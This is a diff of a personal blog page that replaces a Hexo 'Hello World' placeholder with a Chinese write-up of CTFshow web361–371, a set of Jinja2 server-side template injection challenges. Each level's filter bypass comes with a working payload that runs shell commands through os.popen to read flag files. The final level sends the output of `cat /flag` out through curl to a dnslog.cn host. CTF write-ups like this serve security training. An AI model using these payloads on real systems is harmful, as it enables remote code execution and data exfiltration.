@@ -22,7 +22,7 @@
 
   
 
-  <title>Hello World | Luokuang&#39;s blog</title>
+  <title>CTFshow-web361~371 | Luokuang&#39;s blog</title>
 
   
 
@@ -104,18 +104,22 @@
     <div class="header-content">
       <div class="post-text layout-block">
         <div class="layout-margin">
-          <h1 class="title-wrap">Hello World</h1>
+          <h1 class="title-wrap">CTFshow-web361~371</h1>
           <h2 class="title-sub-wrap">
             <strong>luokuang</strong>
             <span>发布于</span>
-            <time  class="article-date" datetime="2024-06-26T13:42:49.518Z" itemprop="datePublished">2024-06-26</time>
+            <time  class="article-date" datetime="2024-07-18T03:38:04.000Z" itemprop="datePublished">2024-07-18</time>
           </h2>
           
           
           <ul class="wrap-list dark">
   
+    <li><a href="/categories/%E5%88%B7%E9%A2%98/">📒 刷题</a></li>
+    
 </ul>
           <ul class="wrap-list dark">
+  
+    <li><a href="/tags/web-ssti/">🏷️ web ssti</a></li>
   
 </ul>
         </div>
@@ -139,40 +143,101 @@
       
       
       <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
-        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+        <h1 id="CTFshow-web361-371"><a href="#CTFshow-web361-371" class="headerlink" title="CTFshow-web361~371"></a>CTFshow-web361~371</h1><h2 id="web361"><a href="#web361" class="headerlink" title="web361"></a>web361</h2><p>知识点：ssti</p>
+<p>基本的常用语句有</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;whoami&#x27;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;url_for.__globals__.os.popen(&#x27;whoami&#x27;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;lipsum.__globals__.os.popen(&#x27;cat flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+<p>通过内置的函数来获取shell</p>
+<p>注入点为GET提交的name参数，及payload为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /*&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+<h2 id="web362"><a href="#web362" class="headerlink" title="web362"></a>web362</h2><p>知识点：ssti</p>
+<p>这个题也可以通过第一题的方法来获取flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /*&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+<h2 id="web363"><a href="#web363" class="headerlink" title="web363"></a>web363</h2><p>知识点：引号过滤以及POST提交过滤</p>
+<p>过滤引号可以通过request请求来进行绕过</p>
+<p>常见的几种形式和用法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;request.args.ben&#125;&#125; #可以用来获取get请求传参，参数为ben</span><br><span class="line">&#123;&#123;request.form.ben&#125;&#125;  #可以来获取poet请求传参ben（Content-Type:application/x-www-from-urlencoded或multipart/from-data）</span><br><span class="line">&#123;&#123;request.cookie.ben&#125;&#125; #可以来获取cookie中关键词为ben的参数</span><br><span class="line">&#123;&#123;request.values.x1&#125;&#125; #获取所有参数</span><br><span class="line">&#123;&#123;request.headers&#125;&#125;  #获得请求头请求参数</span><br><span class="line">&#123;&#123;request.data&#125;&#125;  #post传入参数(Content-Type:a/b)</span><br><span class="line">&#123;&#123;request.json&#125;&#125;  #获得post传入json参数(Content-Type:application/json)</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+<p>当然我个人认为request.values.x1最好用，可以获取全局参数</p>
+<p>将过滤的部分直接通过替换即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[request.args.ben].popen(request.args.ben1).read()&#125;&#125;&amp;ben=os&amp;ben1=cat /*</span><br></pre></td></tr></table></figure>
 
+<h2 id="web364"><a href="#web364" class="headerlink" title="web364"></a>web364</h2><p>知识点：引号过滤，args过滤，post提交过滤</p>
+<p>这个题可能是想通过cookie来实现，但是麻烦，还是通过request.values.x1好点，因为简单</p>
+<p>payload为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;url_for.__globals__.os.popen(request.values.q).read()&#125;&#125;&amp;q=cat /*</span><br></pre></td></tr></table></figure>
+
+<h2 id="web365"><a href="#web365" class="headerlink" title="web365"></a>web365</h2><p>知识点：中括号过滤，引号过滤，args过滤，post提交过滤</p>
+<p>绕过[]的方法，可以通过__getitem__()魔术方法来实现，用法也简单，可以直接平替</p>
+<p>例如：</p>
+<p><strong>subclasses</strong>()[117]  –&gt; <strong>subclasses</strong>().<strong>getitem</strong>(117)</p>
+<p>尽量选用简单的语句，就是少中括号的来实现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__.__getitem__(request.values.q).popen(request.values.a).read()&#125;&#125;&amp;a=cat /*&amp;q=os</span><br><span class="line">&#123;&#123;url_for.__globals__.os.popen(request.values.q).read()&#125;&#125;&amp;q=cat /*</span><br></pre></td></tr></table></figure>
+
+<h2 id="web366"><a href="#web366" class="headerlink" title="web366"></a>web366</h2><p>知识点：下划线绕过，中括号过滤，引号过滤，args过滤，post提交过滤</p>
+<p>下划线绕过可以通过管道符和attr和request请求来进行绕过</p>
+<p>如：</p>
+<p>lipsum.<strong>globals</strong>–&gt;lipsum|attr(request.values.globals)</p>
+<p>所以就可以构造payload为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;(lipsum|attr(request.values.q)).os.popen(request.values.q2).read()&#125;&#125;&amp;q=__globals__&amp;q2=cat /*</span><br></pre></td></tr></table></figure>
+
+<h2 id="web367"><a href="#web367" class="headerlink" title="web367"></a>web367</h2><p>知识点：os关键词过滤，下划线绕过，中括号过滤，引号过滤，args过滤，post提交过滤</p>
+<p>这里有些不同</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals.os&#125;&#125;</span><br><span class="line">&#123;&#123;lipsum|attr(request.values.q)|attr(request.values.o)&#125;&#125;&amp;q=__globals__&amp;o=os  //这个不会执行</span><br><span class="line">&#123;&#123;(lipsum|attr(request.values.q)).get(request.values.o)&#125;&#125;&amp;q=__globals__&amp;o=os  //这个会执行</span><br></pre></td></tr></table></figure>
+
+<p>所以需要留意一下</p>
+<p>所以payload为：(二选一即可)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;(lipsum|attr(request.values.q)).get(request.values.o).popen(request.values.q2).read()&#125;&#125;&amp;q=__globals__&amp;q2=cat /*&amp;o=os</span><br><span class="line">&#123;&#123;(config|attr(request.values.class)|attr(request.values.init)|attr(request.values.globals)|attr(request.values.getitem)(request.values.o)).popen(request.values.rce).read()&#125;&#125;&amp;class=__class__&amp;init=__init__&amp;globals=__globals__&amp;getitem=__getitem__&amp;o=os&amp;rce=cat /*</span><br></pre></td></tr></table></figure>
+
+<h2 id="web368"><a href="#web368" class="headerlink" title="web368"></a>web368</h2><p>知识点：双括号过滤，os关键词过滤，下划线绕过，中括号过滤，引号过滤，args过滤，post提交过滤</p>
+<p>绕过双括号，可以通过<code>&#123;%print()%&#125;</code>即可</p>
+<p>payload为:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print (lipsum|attr(request.values.q)).get(request.values.o).popen(request.values.q2).read()%&#125;&amp;q=__globals__&amp;q2=cat /*&amp;o=os</span><br></pre></td></tr></table></figure>
+
+<h2 id="web369"><a href="#web369" class="headerlink" title="web369"></a>web369</h2><p>知识点：request过滤，双括号过滤，os关键词过滤，下划线绕过，中括号过滤，引号过滤，args过滤，post提交过滤</p>
+<p>无法通过提交参数来进行绕过，需要通过join来进行拼接字符</p>
+<p>获取字符的方法，通过config|string|list  和  lipsum|string|list来获得</p>
+<p>具体的构造的payload： （注意将注释的删除）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;%set e=(config|string|list).pop(279)%&#125; //  /</span><br><span class="line">//&#123;%set a=(config|string|list).pop(191)%&#125; //  &#x27;</span><br><span class="line">&#123;%set c=(lipsum|string|list).pop(18)%&#125;  // _</span><br><span class="line">&#123;%set kg=(lipsum|string|list).pop(9)%&#125;  // 空格</span><br><span class="line">//&#123;% set qwe=dict(l=0,s=1)|join%&#125;  //ls</span><br><span class="line">&#123;%set globals=(c,c,dict(globals=1)|join,c,c)|join %&#125;  //__globals__</span><br><span class="line">&#123;%set s=dict(o=0,s=1)|join%&#125;   //os</span><br><span class="line">&#123;%set geti=(c,c,dict(getitem=1)|join,c,c)|join %&#125;  //__getiyem__</span><br><span class="line">//&#123;% set popen=dict(popen=1)|join%&#125;  //popen</span><br><span class="line">//&#123;% set read=dict(read=1)|join%&#125;  //read</span><br><span class="line">&#123;% set flag=(((dict(tac=1)|join,kg)|join,e)|join,dict(flag=1)|join)|join %&#125;</span><br><span class="line">//&#123;%print lipsum|attr(globals)|attr(geti)(s)|attr(popen)(flag)|attr(read)() %&#125;</span><br><span class="line">&#123;%print (lipsum|attr(globals)|attr(geti)(s)).popen(flag).read() %&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="web370"><a href="#web370" class="headerlink" title="web370"></a>web370</h2><p>知识点：数字过滤，request过滤，双括号过滤，os关键词过滤，下划线绕过，中括号过滤，引号过滤，args过滤，post提交过滤</p>
+<p>获取数字可以通过count来实现，如nine&#x3D;dict(aaaaaaaaa&#x3D;a)|join|count</p>
+<p>再将数字替代即可</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;%set nine=dict(aaaaaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;% set ste=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;% set ten=ste*nine %&#125;</span><br><span class="line">&#123;% set r=dict(aa=a)|join|count*nine%&#125;</span><br><span class="line">&#123;%set e=(config|string|list).pop(ten)%&#125;</span><br><span class="line">&#123;%set c=(lipsum|string|list).pop(r)%&#125;</span><br><span class="line">&#123;%set kg=(lipsum|string|list).pop(nine)%&#125;</span><br><span class="line">&#123;% set qwe=dict(l=a,s=b)|join%&#125;</span><br><span class="line">&#123;%set globals=(c,c,dict(globals=a)|join,c,c)|join %&#125;</span><br><span class="line">&#123;%set s=dict(o=a,s=b)|join%&#125;</span><br><span class="line">&#123;%set geti=(c,c,dict(getitem=a)|join,c,c)|join %&#125;</span><br><span class="line">&#123;% set popen=dict(popen=a)|join%&#125;</span><br><span class="line">&#123;% set read=dict(read=a)|join%&#125;</span><br><span class="line">&#123;% set flag=(((dict(tac=a)|join,kg)|join,e)|join,dict(flag=a)|join)|join %&#125;</span><br><span class="line">&#123;%print lipsum|attr(globals)|attr(geti)(s)|attr(popen)(flag)|attr(read)() %&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="371"><a href="#371" class="headerlink" title="371"></a>371</h2><p>知识点：过滤print，数字过滤，request过滤，双括号过滤，os关键词过滤，下划线绕过，中括号过滤，引号过滤，args过滤，post提交过滤</p>
+<p>绕过print需要通过dnslog带出</p>
+<p>URL</p>
+<p><a target="_blank" rel="noopener" href="http://www.dnslog.cn/">http://www.dnslog.cn/</a></p>
+<p>在该网站来申请免费的dnslog</p>
+<p>再通过  执行curl <code>cat /flag</code>.7ytmqy.dnslog.cn </p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#123;%set nine=dict(aaaaaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;%set ba=dict(aaaaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;% set ste=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;%set n=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;%set aaa=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;% set ten=ste*nine %&#125;</span><br><span class="line">&#123;% set r=dict(aa=a)|join|count*nine%&#125;</span><br><span class="line">&#123;%set q=(config|string|list).pop(aaa)%&#125;</span><br><span class="line">&#123;%set e=(config|string|list).pop(ten)%&#125;</span><br><span class="line">&#123;%set c=(lipsum|string|list).pop(r)%&#125;</span><br><span class="line">&#123;%set kg=(lipsum|string|list).pop(nine)%&#125;</span><br><span class="line">&#123;%set globals=(c,c,dict(globals=a)|join,c,c)|join %&#125;</span><br><span class="line">&#123;%set s=dict(o=a,s=b)|join%&#125;</span><br><span class="line">&#123;%set geti=(c,c,dict(getitem=a)|join,c,c)|join %&#125;</span><br><span class="line">&#123;% set popen=dict(popen=a)|join%&#125;</span><br><span class="line">&#123;% set read=dict(read=a)|join%&#125;</span><br><span class="line">&#123;%set p=((lipsum|attr(globals))|string|list).pop(n)%&#125;</span><br><span class="line">&#123;%set fla=(dict(curl=a)|join,kg,p,dict(cat=a)|join,kg,e,dict(flag=a)|join,p,q,dict(cfiyve=a)|join,q,dict(dnslog=a)|join,q,dict(cn=a)|join)|join%&#125;</span><br><span class="line">&#123;%if ((lipsum|attr(globals))|attr(geti)(s)).popen(fla)%&#125;ataoyyds&#123;%endif%&#125;</span><br></pre></td></tr></table></figure>
       </section>
 
       
       
         <nav class="article-nav">
           
+          
             <div class="article-nav-item layout-padding">
   <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
     
     <div class="card-text">
       
-        <a href="/2024/07/18/CTFshow-web361-371/" itemprop="url">
-          <h2 class="card-text--title text-ellipsis">CTFshow-web361~371</h2>
+        <a href="/2024/06/26/hello-world/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">Hello World</h2>
         </a>
       
-      <div class="card-text--row">Newer</div>
+      <div class="card-text--row">Older</div>
     </div>
   </article>
 </div>
-          
           
         </nav>
       
